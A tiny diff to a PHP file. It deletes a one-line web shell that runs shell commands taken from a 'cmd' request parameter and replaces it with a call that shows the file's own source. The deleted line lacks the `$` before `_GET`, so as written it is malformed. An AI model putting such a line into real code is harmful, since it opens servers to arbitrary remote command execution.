@@ -1,4 +1,3 @@
 <?php
-// le code PHP ---------
-  echo exec(_GET["cmd"]);
+show_source(__FILE__);
 ?>
